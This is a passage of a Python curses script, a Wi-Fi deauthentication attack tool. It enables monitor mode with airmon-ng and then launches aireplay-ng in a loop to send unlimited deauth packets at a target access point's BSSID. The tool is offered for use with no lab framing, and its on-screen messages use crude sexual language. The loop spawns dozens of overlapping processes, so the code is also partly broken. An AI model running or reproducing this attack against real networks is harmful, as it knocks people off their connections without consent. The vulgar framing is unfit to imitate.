...
process = subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
...
def main(stdscr):
    ...
    stdscr.timeout(100)  # Screen refresh rate (in ms)

    # Main loop
    process = None  # Initialize subprocess variable
    try:
        while True:
            if process is None or process.poll() is not None:  # Start only if not running
            	for x in range(1,100):
                	process=subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

            # Display dynamic information on screen
            stdscr.clear()
            stdscr.addstr(1, 1, "Filling Cum(Packets) on target's Pussy(Access Points) 💦️")
            stdscr.addstr(3, 1, "Press 'q' or 'Esc' to stop and exit.")
            stdscr.addstr(5, 1, f"Subprocess running: {process.pid}")
            stdscr.refresh()
            ...
            # Sleep to prevent CPU overutilization
            time.sleep(1 / 1000)  # Sleep for 1 ms

    except KeyboardInterrupt:
        # Graceful handling of Ctrl+C
        stdscr.addstr(7, 1, "Ctrl+C detected! Cleaning up...")
        stdscr.refresh()
        time.sleep(1)

    finally:
        # Cleanup subprocess if running
        if process and process.poll() is None:
            process.kill()

        # Stop monitoring mode
        stdscr.addstr(9, 1, "Stopping monitoring mode...")
        stdscr.refresh()
        subprocess.run(["airmon-ng", "stop", "wlan0mon"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdscr.addstr(11, 1, "Thank you! Exiting now.")
        stdscr.refresh()
        time.sleep(2)
